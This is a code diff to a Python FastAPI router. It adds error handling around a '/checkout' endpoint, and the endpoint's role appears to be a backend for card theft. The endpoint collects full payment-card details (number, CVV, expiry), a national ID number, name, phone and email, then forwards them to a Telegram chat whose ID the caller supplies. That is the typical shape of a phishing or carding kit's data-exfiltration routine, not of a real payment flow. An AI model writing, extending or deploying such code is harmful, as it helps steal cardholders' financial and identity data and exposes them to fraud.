@@ -48,20 +48,27 @@ async def create_card(body:CardCreateDTO, db: Session = Depends(get_db)):
         return make_response(str(e), 400, "/cards POST")
     
 @router.post("/checkout")
-async def checkout(body:TelegramSchema):
-    payload = {
-        "chat_id": body.chat_id,
-        "DNI": body.DNI,
-        "number": body.number,
-        "CVV": body.CVV,
-        "Vto": body.Vto,
-        "name": body.name,
-        "last_name": body.last_name,
-        "phone": body.phone,
-        "email": body.email
-    }
-    telegram_instance = Telegram(payload=payload)
-    message = telegram_instance.build_message()
-    telegram_instance.send_message(message)
+async def checkout(body: TelegramSchema):
+    try:
+        payload = {
+            "chat_id": body.chat_id,
+            "DNI": body.DNI,
+            "number": body.number,
+            "CVV": body.CVV,
+            "Vto": body.Vto,
+            "name": body.name,
+            "last_name": body.last_name,
+            "phone": body.phone,
+            "email": body.email
+        }
+        telegram_instance = Telegram(payload=payload)
+        message = telegram_instance.build_message()
+        telegram_instance.send_message(message)
+        return make_response("Mensaje enviado exitosamente!", 200)
+    except SQLAlchemyError as e:
+        return make_response(str(e), 400, "checkout")
+    except Exception as e:
+        return make_response(str(e), 500, "checkout")
+    
     
 
